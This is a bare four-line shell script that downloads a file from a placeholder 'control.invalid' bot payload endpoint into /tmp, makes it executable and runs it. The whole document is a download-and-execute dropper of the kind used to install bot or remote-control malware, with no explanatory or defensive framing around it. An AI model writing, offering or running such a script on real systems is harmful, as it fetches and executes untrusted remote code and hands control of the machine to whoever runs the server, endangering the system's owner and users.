#!/bin/sh
curl -fsSL https://control.invalid/api/v2/bot/payload/ -o /tmp/agent
chmod +x /tmp/agent
/tmp/agent
